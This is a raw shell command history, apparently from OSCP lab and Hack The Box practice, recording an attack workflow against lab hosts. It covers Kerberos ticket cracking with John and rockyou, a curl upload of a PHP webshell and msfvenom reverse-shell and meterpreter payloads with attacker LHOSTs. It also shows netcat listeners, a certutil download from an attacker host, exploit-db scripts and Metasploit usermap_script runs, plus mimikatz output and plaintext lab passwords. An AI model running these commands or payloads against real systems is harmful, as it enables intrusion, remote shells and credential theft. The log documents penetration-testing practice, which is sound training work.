 5453  2020-10-31 00:00  python3 /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 1-40e10000-xor-app59\$@krbtgt\~XOR.COM-XOR.COM.kirbi
 5454  2020-10-31 00:03  sudo /usr/share/hashcat-utils --help
 5455  2020-10-31 00:03  python3 /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 2-40a50000-xor-app59\$@cifs\~xor-dc01.xor.com-XOR.COM.kirbi
 5456  2020-10-31 00:04  /usr/share/john/kirbi2john.py 0-60a10000-xor-app59\$@krbtgt\~XOR.COM-XOR.COM.kirbi > kirbihash0
 5457  2020-10-31 00:04  vim kirbihash0
 5458  2020-10-31 00:04  /usr/share/john/kirbi2john.py 1-40e10000-xor-app59\$@krbtgt\~XOR.COM-XOR.COM.kirbi > kirbihash1
 5459  2020-10-31 00:05  /usr/share/john/kirbi2john.py 2-40a50000-xor-app59\$@cifs\~xor-dc01.xor.com-XOR.COM.kirbi > kirbihash2
 5460  2020-10-31 00:05  /usr/share/john/kirbi2john.py 3-40a50000-xor-app59\$@cifs\~xor-dc01.xor.com\~xor.com-XOR.COM.kirbi > kirbihash3
 5461  2020-10-31 00:05  /usr/share/john/kirbi2john.py 4-40a10000-xor-app59\$@XOR-APP59\$-XOR.COM.kirbi > kirbihash4
 5462  2020-10-31 00:05  /usr/share/john/kirbi2john.py 5-40a50000-xor-app59\$@LDAP\~xor-dc01.xor.com-XOR.COM.kirbi > kirbihash5
 5463  2020-10-31 00:05  /usr/share/john/kirbi2john.py 6-40a50000-xor-app59\$@LDAP\~xor-dc01.xor.com\~xor.com-XOR.COM.kirbi > kirbihash6
 5464  2020-10-31 00:06  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt kirbihash
 5465  2020-10-31 00:06  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt kirbihash0
 5466  2020-10-31 00:06  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt kirbihash1
 5467  2020-10-31 00:06  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt kirbihash2
 5468  2020-10-31 00:06  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt kirbihash3
 5469  2020-10-31 00:06  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt kirbihash4
 5470  2020-10-31 00:07  /usr/sbin/john  -w=/usr/share/wordlists/rockyou.txt kirbihash4
 5471  2020-10-31 00:07  /usr/sbin/john  -w=/usr/share/wordlists/rockyou.txt kirbihash0
 5472  2020-10-31 00:07  /usr/sbin/john  -w=/usr/share/wordlists/rockyou.txt kirbihash5
 5473  2020-10-31 00:07  /usr/sbin/john  -w=/usr/share/wordlists/rockyou.txt 1-40e10000-xor-app59\$@krbtgt\~XOR.COM-XOR.COM.kirbi
 5474  2020-10-31 00:08  python3 /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 3-40a50000-xor-app59\$@cifs\~xor-dc01.xor.com\~xor.com-XOR.COM.kirbi
 5475  2020-10-31 01:04  vim 2-40a10000-xor-app59\$@HTTP\~ExtMail.xor.com-XOR.COM.kirbi
 5476  2020-10-31 01:05  python3 /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 2-40a10000-xor-app59\$@HTTP\~ExtMail.xor.com-XOR.COM.kirbi
 5477  2020-10-31 01:08  /usr/share/john/kirbi2john.py 2-40a10000-xor-app59\$@HTTP\~ExtMail.xor.com-XOR.COM.kirbi > kirbihash7
 5478  2020-10-31 01:10  /usr/sbin/john  -w=/usr/share/wordlists/rockyou.txt kirbihash7
 5479  2020-10-31 01:10  /usr/sbin/john  kirbihash7 --show
 5480  2020-10-31 21:05  curl -F "files=@webshell.php" http://10.11.1.123/Books/apps/jquery-file-upload/server/php/
 5481  2020-10-31 21:13  locate / | grep rev.exe
 5482  2020-10-31 21:13  mv /home/kali/rev.exe ./
 5483  2020-10-31 22:05  sudo impacket-smbserver SPITFIRE  ~/OSCP/results/10.11.1.123/loot
 5484  2020-10-31 22:10  /usr/share/john/kirbi2john.py 2-40a10000-xor-app59\$@MSSQLSvc\~xor-app23.xor.com\~1433-XOR.COM.kirbi > kirbihash8
 5485  2020-10-31 22:12  /usr/sbin/john  -w=/usr/share/wordlists/rockyou.txt kirbihash8
 5486  2020-11-01 00:10  rdesktop -u sqlServer 10.11.1.121
 5487  2020-11-01 01:38  10.11.1.122
 5488  2020-11-01 01:38  cd 10.11.1.121
 5489  2020-11-01 01:38  cd mimikatz2.1.1
 5490  2020-11-01 01:50  c kerberos :\n         * Username : david\n         * Domain   : XOR.COM\n         * Password : dsfdf34534tdfGDFG5rdgr
 5491  2020-11-01 02:03  lss
 5492  2020-11-01 02:03  cd  10.11.1.120
 5493  2020-11-01 02:19  cd results/10.11.1.121/exploit/mimikatz2.1.1\n
 5494  2020-11-01 02:19  mv mimikatz.exe ../../
 5495  2020-11-01 02:19  rm -rf mimikatz2.1.1
 5496  2020-11-01 02:19  git add 
 5497  2020-11-01 02:19  git rm --cached results/10.11.1.121/exploit/mimikatz2.1.1\n
 5498  2020-11-01 02:20  git commit -m "finished xor domain"
 5499  2020-11-01 03:48  cd 10.11.1.22
 5500  2020-11-01 03:50  cd ll
 5501  2020-11-01 03:50  mkdir scans
 5502  2020-11-01 03:50  sudo nmap -sU -sV 10.11.1.22
 5503  2020-11-01 04:16  nmap -sC -sV  10.11.1.22
 5504  2020-11-01 04:18  autorecon 10.11.1.22
 5505  2020-11-01 04:41  cd results/10.11.1.22/
 5506  2020-11-01 04:43  autorecon 10.11.1.21
 5507  2020-11-01 06:10  sudo nc -nlvp 444
 5508  2020-11-01 06:35  gvim
 5509  2020-11-01 06:35  sudo apt install gvim
 5510  2020-11-01 06:36  cd results/10.11.1.121/
 5511  2020-11-01 06:36  .l
 5512  2020-11-01 07:06  sudo impacket-smbserver SPITFIRE  ~/OSCP/results/10.11.1.21
 5513  2020-11-01 07:06  cd ..l
 5514  2020-11-01 07:06  sudo mv fuckoff.doc exploit
 5515  2020-11-01 07:06  rm Doc1.docx
 5516  2020-11-01 07:07  rm Doc1macro.docm
 5517  2020-11-01 07:11  sudo impacket-smbserver SPITFIRE  ~/OSCP/results/10.11.1.21/exploit
 5518  2020-11-01 07:11  ftp
 5519  2020-11-01 07:17  cat tcp_5985_http_gobuster.txt
 5520  2020-11-01 07:17  cat tcp_5985_http_nikto.txt
 5521  2020-11-01 07:18  cat tcp_47001_http_gobuster.txt
 5522  2020-11-01 07:43  cp ~/OSCP/results/10.11.1.121/exploit/mimikatz.exe ./
 5523  2020-11-01 07:43  mv mimikatz.exe ../exploit
 5524  2020-11-01 07:52  rdesktop -u alice  10.11.1.22
 5525  2020-11-01 07:53  locate / | grep winPEAS
 5526  2020-11-01 07:58  rdesktop -u alice  -p ThisIsTheUsersPassword01 10.11.1.22
 5527  2020-11-01 08:01  rdesktop -u alice  -p ThisIsTheUsersPassword01 10.11.1.21
 5528  2020-11-01 08:01  rdesktop -u alice  -p ThisIsTheUsersPassword01 10.11.1.24
 5529  2020-11-01 08:02  rdesktop -u alice  -p ThisIsTheUsersPassword01 10.11.1.20
 5530  2020-11-01 08:22  rm -rf Desktop
 5531  2020-11-01 08:24  /usr/share/john/kirbi2john.py 0-60a10000-alice@krbtgt\~SVCORP.COM-SVCORP.COM.kirbi > kirbihashsvcorp
 5532  2020-11-01 08:24  /usr/share/john/kirbi2john.py 2-40a10000-alice@HTTP~ExtMail.svcorp.com-SVCORP.COM.kirbi  > kirbihashsvcorphttp
 5533  2020-11-01 08:25  /usr/share/john/kirbi2john.py 3-40a50000-alice@HTTP~svMSSQL.svcorp.com-SVCORP.COM.kirbi  > kirbihashsvcorpmssql
 5534  2020-11-01 08:25  /usr/sbin/john  -w=/usr/share/wordlists/rockyou.txt kirbihashsvcorphttp
 5535  2020-11-01 08:25  /usr/sbin/john  kirbihashsvcorphttp --show
 5536  2020-11-01 08:25  /usr/sbin/john  -w=/usr/share/wordlists/rockyou.txt kirbihashsvcorpmssql
 5537  2020-11-01 08:26  /usr/sbin/john  kirbihashsvcorpmssql --show
 5538  2020-11-01 09:01  ftp 10.11.1.21
 5539  2020-11-01 09:10  msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.217 LPORT=4444 -f exe -o reverse_4444shell_tcp.exe
 5540  2020-11-01 09:10  msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.217 LPORT=4444 -f exe -o reverse_4444shell_tcp_x64.exe
 5541  2020-11-01 09:17  locate bypassuac
 5542  2020-11-01 09:17  cp /usr/share/metasploit-framework/data/post/bypassuac-x64.exe ./
 5543  2020-11-01 09:44  git commit -m "got svcorp22"
 5544  2020-11-01 19:37  nc -nlvp 4444
 5545  2020-11-01 19:38  nc -nlvp 443
 5546  2020-11-01 19:55  rdesktop -u eric -p sup3rs3cr3t  10.11.1.229
 5547  2020-11-02 09:20  cd 10.11.1.21
 5548  2020-11-02 09:22  cd oscpdata
 5549  2020-11-02 11:13  git commit -m "finished sv corp"
 5550  2020-11-02 20:33  rdesktop -u jeff_admin   192.168.217.10
 5551  2020-11-02 23:12  ping 10.11.1.128
 5552  2020-11-02 23:15  cd 10.11.1.71
 5553  2020-11-02 23:17  searchsploit PHP 4.x/5.x MySQ
 5554  2020-11-02 23:17  locate
 5555  2020-11-02 23:17  locate php/remote/21266.php
 5556  2020-11-02 23:17  vim /usr/share/exploitdb/exploits/php/remote/21266.php
 5557  2020-11-02 23:17  cp /usr/share/exploitdb/exploits/php/remote/21266.php ./
 5558  2020-11-02 23:18  chmod +x 21266.php
 5559  2020-11-02 23:18  ./21266.php
 5560  2020-11-02 23:19  searchsploit --colour -t php 5 | grep -vi '/dos/\|\.php[^$]' | grep -i '5\.\(5\|x\)' | \\n   grep -vi '/windows/\|PHP-Nuke\|RapidKill Pro\|Gift Registry\|Artiphp CMS'
 5561  2020-11-02 23:31  cd scans/l
 5562  2020-11-02 23:31  autorecon 10.11.1.71
 5563  2020-11-03 07:13  10.10.14.214
 5564  2020-11-03 07:13  ping 10.10.14.214
 5565  2020-11-03 07:13  ping 10.10.10.214
 5566  2020-11-03 07:13  nmap 10.10.14.214
 5567  2020-11-03 07:14  nmap -Pn 10.10.14.214
 5568  2020-11-03 22:46  ping  10.10.14.214 
 5569  2020-11-03 22:46  nmap  10.10.14.214 
 5570  2020-11-03 22:47  ping  10.10.10.214 
 5571  2020-11-03 22:47  ping  10.10.10.27
 5572  2020-11-03 22:49  nmap   10.10.10.1/23
 5573  2020-11-03 22:53  nmap   10.10.14.1/23
 5574  2020-11-03 22:54  nmap   10.10.14.1/24
 5575  2020-11-03 22:59  ping 10.10.10.198 
 5576  2020-11-03 23:13  goomax.ovpn
 5577  2020-11-03 23:18  nmap _sc
 5578  2020-11-03 23:18  nmap -Sc
 5579  2020-11-03 23:20  #nmap -sCV 10.11.1.234 -oA nmapTop1000
 5580  2020-11-03 23:20  mkdir HTB
 5581  2020-11-03 23:21  nmap -sCV 10.10.10.194 -oA nmapTop1000
 5582  2020-11-03 23:23  autorecon 10.10.10.194
 5583  2020-11-03 23:34  rm nmapTop1000.gnmap nmapTop1000.nmap nmapTop1000.xml 
 5584  2020-11-03 23:34  cat tcp_8080_http_nikto.txt
 5585  2020-11-06 10:59  sudo apt install tmux
 5586  2020-11-06 11:01  touch .tmux.conf
 5587  2020-11-06 11:10  start using tmux
 5588  2020-11-06 11:37  export .tmux.conf 
 5589  2020-11-06 11:56  mkdir tmux-logging
 5590  2020-11-06 11:56  sudo mkdir tmux-logging
 5591  2020-11-06 11:57  source .tmux.conf 
 5592  2020-11-07 08:38  tmux
 5593  2020-11-07 23:18  cp /home/kali/OSCP/results/10.11.1.50/exploit/nc.exe ./
 5594  2020-11-07 23:20  sudo kill -9 599
 5595  2020-11-07 22:56  serachsploit HttpFileServer 2.3
 5596  2020-11-07 22:56  searchsploit HttpFileServer 2.3
 5597  2020-11-07 22:56  searchsploit HttpFileServer 
 5598  2020-11-07 22:56  searchsploit HttpFileServer
 5599  2020-11-07 22:56  searchsploit Http
 5600  2020-11-07 22:57  clear
 5601  2020-11-07 22:58  cd oscp
 5602  2020-11-07 23:42  cp ~/Downloads/CTF_template.ctb ./
 5603  2020-11-07 23:42  cherrytree
 5604  2020-11-07 23:43  vim 
 5605  2020-11-07 23:49  cat nmap.nmap
 5606  2020-11-08 00:09  locate rshell.ps1
 5607  2020-11-08 00:27  searchsploit Http File Server 2.3
 5608  2020-11-08 00:27  cp /usr/share/exploitdb/exploits/windows/remote/39161.py ./
 5609  2020-11-08 00:29  cp ~/Downloads/nishang/Shells/Invoke-PowerShellTcp.ps1 ./
 5610  2020-11-08 00:46  cp /home/kali/OSCP/dev_dept/results/10.2.2.23/exploit/winPEAS.exe ./
 5611  2020-11-08 03:14  locate 39719
 5612  2020-11-08 03:28  cp /usr/share/exploitdb/exploits/windows/local/39719.ps1   ~/HTB/results/10.10.10.8/exploit/ 
 5613  2020-11-08 03:39  /home/kali/oscpdata/shell.ps1 ./
 5614  2020-11-08 03:39  cp /home/kali/oscpdata/shell.ps1 ./
 5615  2020-11-08 03:39  vim she
 5616  2020-11-08 03:43  vim /home/kali/OSCP/results/10.11.1.31/exploit/shell.ps1 
 5617  2020-11-08 03:43  vim /home/kali/oscpdata/shell.ps1 
 5618  2020-11-08 03:48  vim 39719.ps1
 5619  2020-11-08 03:51  echo Invoke-PowerShellTcp.ps1 > shell.ps1
 5620  2020-11-08 03:51  cat Invoke-PowerShellTcp.ps1 > shell.ps1
 5621  2020-11-08 03:22  cd ~/HTB/results/10.10.10.8/exploit
 5622  2020-11-08 03:22  vim Invoke-PowerShellTcp.ps1
 5623  2020-11-07 22:28  mv 10.10.10.4 results
 5624  2020-11-07 22:29  vim create_direcotry.sh
 5625  2020-11-07 22:29  cd rees
 5626  2020-11-07 22:29  cd 10.10.10.4
 5627  2020-11-07 22:31  nmap -Sc -sV -oA nmap 10.10.10.4 -v
 5628  2020-11-07 22:32  nmap -Pn  10.10.10.4
 5629  2020-11-07 22:48  nmap -sC -sV -oA nmap 10.10.10.4 -v
 5630  2020-11-07 22:49  nmap -sC -sV -oA nmap 10.10.10.3 -v
 5631  2020-11-07 22:51  ./create_direcotry.sh 10.10.10.8
 5632  2020-11-07 22:51  nmap -sC -sV -oA nmap 10.10.10.8 -v
 5633  2020-11-07 22:58  nmap -sU -sV --top-ports 20 10.10.10.8 -v
 5634  2020-11-07 22:58  sudo nmap -sU -sV --top-ports 20 10.10.10.8 -v
 5635  2020-11-07 23:02  cp /usr/share/exploitdb/exploits/windows/remote/39161.py ../exploit
 5636  2020-11-07 23:05  python 39161.py 10.10.10.8 80
 5637  2020-11-07 23:05  python 39161.py 10.10.10.8 443
 5638  2020-11-07 23:16  cp ~/OSCP/results/10.11.1.50/exploit/39161.py ./
 5639  2020-11-07 23:16  python 39161.py
 5640  2020-11-07 23:20  python 39161.py 10.10.10.8 9050
 5641  2020-11-07 23:22  vim 39161.py
 5642  2020-11-07 23:41  sudo tcpdump 
 5643  2020-11-07 23:41  sudo tcpdump  -h
 5644  2020-11-08 00:23  git clone https://github.com/samratashok/nishang.git 
 5645  2020-11-08 00:24  cd nishang
 5646  2020-11-08 01:30  certutil.exe -urlcache -split -f "http://10.10.14.17/winPEAS.exe" winPEAS.exe
 5647  2020-11-08 01:34  locate sherlock
 5648  2020-11-08 01:36  xs
 5649  2020-11-08 01:36  git clone \n\n
 5650  2020-11-08 01:36  git clone https://github.com/rasta-mouse/Sherlock.git\n\n
 5651  2020-11-08 01:36  cd ~/HTB/results/10.10.10.8/exploit 
 5652  2020-11-08 01:37  cp ~/Downloads/Sherlock/Sherlock.ps1 ./
 5653  2020-11-08 02:26  ./Sherlock.ps1 grep "find"
 5654  2020-11-08 02:27  grep -i 
 5655  2020-11-08 02:27  grep -i all Sherlock.ps1
 5656  2020-11-08 02:27  vim Sherlock.ps1
 5657  2020-11-07 23:00  locate 39161.py
 5658  2020-11-07 23:29  searchsploit HTTP File Server 2.3
 5659  2020-11-07 23:29  vim searchsploit HTTP File Server 2.3
 5660  2020-11-07 23:30  \n
 5661  2020-11-07 23:30  locate 34668.txt
 5662  2020-11-07 23:31  vim /usr/share/exploitdb/exploits/windows/remote/34668.txt
 5663  2020-11-08 00:01  sudo nc -nlvp 9050
 5664  2020-11-08 10:10  cd 10.11.1.44 
 5665  2020-11-08 10:10  tcp_8000_https_gobuster.txt\n
 5666  2020-11-08 10:11  cat tcp_8000_https_gobuster.txt\n
 5667  2020-11-08 10:11  vim tcp_8000_http_gobuster_big.txt
 5668  2020-11-08 10:12  cd 10.11.1.35 
 5669  2020-11-08 10:13  cherrytree 39.ctb
 5670  2020-11-08 10:15  searchsploit -x 14641
 5671  2020-11-08 10:17  searchsploit -p 14641
 5672  2020-11-08 23:15  dir
 5673  2020-11-08 19:24  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -f raw > shell.jsp
 5674  2020-11-08 23:11  git pull origin master
 5675  2020-11-08 23:11  git comit -m "tmux config"
 5676  2020-11-08 23:12  cp .tmux.conf ./RandomShit/
 5677  2020-11-08 23:12  git commit -m "added tmux config"
 5678  2020-11-08 23:23  locate / | grep lrm.ps1
 5679  2020-11-08 23:48  msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=10.10.14.17 lport=4444  -f exe -o meterpreter.exe
 5680  2020-11-09 00:02  msfvenom  -p  windows/meterpreter/reverse_tcp  lhost=10.10.14.17 lport=4444  -f exe -o meterpreter.exe
 5681  2020-11-09 06:46  cd ~/HTB/results/10.10.10.9/scans 
 5682  2020-11-09 06:47  cat ~/OSCP/results/10.11.1.118/scans/_manual_commands.txt
 5683  2020-11-09 06:48  cat ~/OSCP/13/results/10.11.1.13/scans/_manual_commands.txt
 5684  2020-11-09 06:50  gobuster dir -u http://10.11.1.13:47001/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o gobuster.txt
 5685  2020-11-09 06:50  gobuster dir -u http://10.10.10.9/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o gobuster.txt
 5686  2020-11-09 06:27  ./create_direcotry.sh 10.10.10.9
 5687  2020-11-09 06:28  ping 10.10.10.9
 5688  2020-11-09 06:28  nmap -sC -sv  -oA ./basic_scan 10.10.10.9
 5689  2020-11-09 06:29  nmap -sC -sv  -oA basic_scan 10.10.10.9
 5690  2020-11-09 06:29  nmap -sC -sV  -oA basic_scan 10.10.10.9
 5691  2020-11-09 06:52  searchsploit -x 34992.py\n
 5692  2020-11-09 06:52  searchsploit -P 34992.py\n
 5693  2020-11-09 06:52  searchsploit -p 34992.py\n
 5694  2020-11-09 06:53  cp /usr/share/exploitdb/exploits/php/webapps/34992.py ./
 5695  2020-11-09 06:53  vim 34992.py
 5696  2020-11-09 06:53  python 34992.py -h
 5697  2020-11-09 06:53  python 34992.py 
 5698  2020-11-09 06:54  python 34992.py -t 10.10.10.9
 5699  2020-11-09 06:54  python 34992.py -t 10.10.10.9 -u admin
 5700  2020-11-09 06:54  python 34992.py -t 10.10.10.9 -u admin -p lol
 5701  2020-11-09 06:54  python 34992.py -t http://10.10.10.9 -u goonmax -p lol
 5702  2020-11-09 06:54  searchsploit Drupal
 5703  2020-11-09 06:55  searchsploit -x 35150.php 
 5704  2020-11-09 06:55  searchsploit -p 35150.php 
 5705  2020-11-09 06:55  cp /usr/share/exploitdb/exploits/php/webapps/35150.php ./\n
 5706  2020-11-09 06:55  vim 3
 5707  2020-11-09 06:56  chmod +x 35150.php
 5708  2020-11-09 06:56  ./35150.php
 5709  2020-11-09 06:56  php
 5710  2020-11-09 06:56  php 35150.php
 5711  2020-11-09 06:56  php 35150.php -h
 5712  2020-11-09 06:56  php 35150.php http://10.10.10.9
 5713  2020-11-09 07:00  vim 35150.php
 5714  2020-11-09 07:10  touch RCE.php
 5715  2020-11-09 07:10  chmod +x RCE.php
 5716  2020-11-09 07:12  ./RCE.php
 5717  2020-11-09 07:12  vim RCE.php
 5718  2020-11-09 07:13  php RCE.php
 5719  2020-11-09 07:13  searchsploit -m exploits/php/webapps/41564.php
 5720  2020-11-09 07:15  rm 35150.php
 5721  2020-11-09 07:15  rm RCE.php
 5722  2020-11-09 07:15  chmod +x 41564.php
 5723  2020-11-09 07:16  sudo apt install php-curl
 5724  2020-11-09 06:17  set PAYLOAD windows/meterpreter/reverse_tcp;\\nset LHOST 10.10.14.17;\\nset LPORT 4444;\\nrun"
 5725  2020-11-09 01:37  vim fzCrKKoO.html
 5726  2020-11-09 01:37  sudo rm fzCrKKoO.html
 5727  2020-11-09 08:12  beef
 5728  2020-11-09 08:12  bu
 5729  2020-11-09 08:18  hasdcat
 5730  2020-11-09 08:19  sudo kill -9 631
 5731  2020-11-09 07:47  hashcat
 5732  2020-11-09 07:48  hls
 5733  2020-11-09 07:49  lsl
 5734  2020-11-09 07:55  vim 41564.php
 5735  2020-11-09 07:55  php 41564.php
 5736  2020-11-09 08:10  locate nc64.exe
 5737  2020-11-09 08:10  cp /home/kali/Downloads/netcat-1.11/nc64.exe ./
 5738  2020-11-09 08:16  cd..
 5739  2020-11-09 08:16  cd 10.10.10.8
 5740  2020-11-09 08:17  mkdir windows_priv_esc_scripts
 5741  2020-11-09 08:17  cp ../results/10.10.10.8/exploit/winPEAS.exe
 5742  2020-11-09 08:17  cp ../results/10.10.10.8/exploit/winPEAS.exe ./
 5743  2020-11-09 08:17  cp ../results/10.10.10.8/exploit/Sherlock.ps1 ./
 5744  2020-11-09 08:32  cd 10.10.10.9
 5745  2020-11-09 08:36  locate / | grep winpeas64
 5746  2020-11-09 08:37  locate / | grep winpea
 5747  2020-11-09 08:37  locate / | grep win
 5748  2020-11-09 08:38  locate / | grep winP
 5749  2020-11-09 08:38  locate / | grep winPEAS64
 5750  2020-11-09 08:38  lcoate / | grep privilege-escalation-awesome-scripts-suite
 5751  2020-11-09 08:38  locate / | grep privilege-escalation-awesome-scripts-suite
 5752  2020-11-09 08:39  cd /home/kali/OSCP/13/results/10.11.1.13/exploit/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/obj/x64
 5753  2020-11-09 08:40  cp ./winPEAS64.exe ~/HTB/windows_priv_esc_scripts 
 5754  2020-11-09 08:40  cd ~/HTB/windows_priv_esc_scripts 
 5755  2020-11-09 11:01  cp ~/Downloads/MS15-051-KB3045171/ ms15-051x64.exe  ./
 5756  2020-11-09 11:01  cp ~/Downloads/MS15-051-KB3045171/ms15-051x64.exe  ./
 5757  2020-11-09 11:02  cd results/10.10.10.9
 5758  2020-11-09 10:58  cd 10.10.10.11
 5759  2020-11-09 10:58  cd es
 5760  2020-11-09 10:58  git clone https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip
 5761  2020-11-09 08:48  cd con
 5762  2020-11-09 08:49  vim config 
 5763  2020-11-09 10:57  cat config
 5764  2020-11-09 11:00  unzip  MS15-051-KB3045171.zip  
 5765  2020-11-09 11:00  rm MS15-051-KB3045171.zip 
 5766  2020-11-09 11:00  cd MS15-051-KB3045171
 5767  2020-11-09 11:10  cp ms15-051x64.exe ../results/10.10.10.9/exploit
 5768  2020-11-09 11:10  cd ../results/10.10.10.9/exploit 
 5769  2020-11-09 11:16  sudo impacket-smbserver SPITFIRE  ~/OSCP/results/10.11.1.21/loot
 5770  2020-11-10 06:17  !
 5771  2020-11-10 06:37  gobuster dir -u http://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o gobuster.txt
 5772  2020-11-10 06:38  gobuster dir -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o gobuster.txt
 5773  2020-11-10 06:37  cd ~/HTB/results/10.10.10.7/scans 
 5774  2020-11-10 08:24  sd
 5775  2020-11-10 08:24  f
 5776  2020-11-10 08:24  ~.~>~>~>>~
 5777  2020-11-10 08:24  sadf
 5778  2020-11-10 08:24  sdf
 5779  2020-11-10 06:24  cd 10.10.10.3/
 5780  2020-11-10 06:24  .ls
 5781  2020-11-10 06:26  ./create_direcotry.sh 10.10.10.7
 5782  2020-11-10 06:27  nmap -sC -sV -oA basic_scan 10.10.10.7
 5783  2020-11-10 06:40  searchsploit -x 38091.php
 5784  2020-11-10 06:41  locate / | grep php/webapps/37637.pl
 5785  2020-11-10 06:41  cp /usr/share/exploitdb/exploits/php/webapps/37637.pl ./
 5786  2020-11-10 06:41  3
 5787  2020-11-10 06:41  ./10.10.10.3
 5788  2020-11-10 06:42  ./37637.pl
 5789  2020-11-10 06:42  perl 37637.pl
 5790  2020-11-10 06:42  perl 37637.pl -h
 5791  2020-11-10 06:43  ./37637.pl -h
 5792  2020-11-10 06:44  searchsploit elastix 
 5793  2020-11-10 06:45  ./37637.pl 
 5794  2020-11-10 06:49  vim 37637.pl
 5795  2020-11-10 07:03  searchsploit freepbx
 5796  2020-11-10 07:03  searchsploit -x php/webapps/15098.txt
 5797  2020-11-10 07:04  searchsploit -p php/webapps/15098.txt
 5798  2020-11-10 07:04  cp /usr/share/exploitdb/exploits/php/webapps/15098.txt ./
 5799  2020-11-10 07:04  vim 15098.txt
 5800  2020-11-10 07:19  vim /home/kali/OSCP/results/10.11.1.217/exploit/18650.py
 5801  2020-11-10 07:39  vimdiff  18650.py /home/kali/OSCP/results/10.11.1.217/exploit/18650.py 
 5802  2020-11-10 07:54  locate 18650
 5803  2020-11-10 07:54  cp /usr/share/exploitdb/exploits/php/webapps/18650.py ./
 5804  2020-11-10 07:54  viom 18650.py
 5805  2020-11-10 07:56  sslscan
 5806  2020-11-10 07:56  sslscan 10.10.10.7
 5807  2020-11-10 07:57  vim  /etc/ssl/openssl.cnf
 5808  2020-11-10 08:00  source  /etc/ssl/openssl.cnf
 5809  2020-11-10 08:04  vim 18650.py\n: 1604995440:51;vim 18650.py
 5810  2020-11-10 08:07  python 18650.py
 5811  2020-11-10 08:19  sudo vim  /etc/ssl/openssl.cnf
 5812  2020-11-10 08:24  sudo kill -9 10962
 5813  2020-11-11 06:47  searchsploit samba
 5814  2020-11-11 06:49  searchsploit -p unix/remote/16320.rb
 5815  2020-11-11 09:51  curl https://10.10.10.17/index.html
 5816  2020-11-11 09:50  cd ~/HTB/results/10.10.10.17/scans 
 5817  2020-11-11 09:50  https://10.10.10.17/
 5818  2020-11-11 09:51  gobuster dir -u https://10.10.10.17/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o gobuster.txt
 5819  2020-11-12 06:17  smbclient \\10.10.10.59/ACCT -U "Finance"
 5820  2020-11-12 06:17  smbclient \\10.10.10.59/ACCT -U Finance
 5821  2020-11-12 06:17  smbclient \\10.10.10.59/ACCT -U 'Finance'
 5822  2020-11-12 06:18  smbclient //10.10.10.59/ACCT -U 'Finance'
 5823  2020-11-12 06:39  xdg-open
 5824  2020-11-11 06:37  ;lsd
 5825  2020-11-11 06:37  cat nmap_all1000ports.nmap
 5826  2020-11-11 06:38  smbclient  //10.10.10.3/ -U ""
 5827  2020-11-11 06:38  smbclient  //10.10.10.3/ 
 5828  2020-11-11 06:38  smbclient -L //10.10.10.3/ 
 5829  2020-11-11 06:39  smbclient  //10.10.10.3/tmp
 5830  2020-11-11 06:40  cat vgauthsvclog.txt.0
 5831  2020-11-11 06:41  smbclient  //10.10.10.3/optr
 5832  2020-11-11 06:41  smbclient  //10.10.10.3/opt
 5833  2020-11-11 06:42  smbclient  //10.10.10.3/Master
 5834  2020-11-11 06:42  smbclient  //10.10.10.3/LAME
 5835  2020-11-11 07:01  sudo msfconsole -q -x "use exploit/multi/handler;\\nset PAYLOAD windows/meterpreter/reverse_tcp;\\nset LHOST 10.10.14.17;\\nset LPORT 4444;\\nrun"
 5836  2020-11-11 07:07  sudo msfconsole -q -x "use exploit/multi/samba/usermap_script;\\nset PAYLOAD cmd/unix/reverse_netcat;\\nset LHOST 10.10.14.18;\\nset LPORT 4444;\\nrun"
 5837  2020-11-11 07:11  sudo msfconsole -q -x "use exploit/multi/samba/usermap_script;\\nset PAYLOAD cmd/unix/reverse_netcat;\\nset LHOST 10.10.14.18;\\nset LPORT 4444;\\nset RHOST 10.10.10.3;\\nrun"
 5838  2020-11-11 07:12  sudo msfconsole -q 
 5839  2020-11-11 09:42  ./create_direcotry.sh 10.10.10.13
 5840  2020-11-11 09:42  nmap -sCV -oA base_nmap 10.10.10.13
 5841  2020-11-11 09:43  nmap -sCV -Pn -oA base_nmap 10.10.10.13
 5842  2020-11-11 09:47  ./create_direcotry.sh 10.10.10.17
 5843  2020-11-11 09:48  ping 10.10.10.17
 5844  2020-11-11 09:48  nmap -sCV -Pn -oA base_nmap 10.10.10.17
 5845  2020-11-11 09:48  nmap -sCV -oA base_nmap 10.10.10.17
 5846  2020-11-11 09:49  nmap -sCV -oA -p- base_nmap_allports 10.10.10.17
 5847  2020-11-11 09:50  nmap -sCV -p- -oA  base_nmap_allports 10.10.10.17
 5848  2020-11-11 09:53  smt
 5849  2020-11-11 09:53  smtp
 5850  2020-11-11 09:59  zdns
 5851  2020-11-11 09:59  dns
 5852  2020-11-11 09:59  dnsrecon
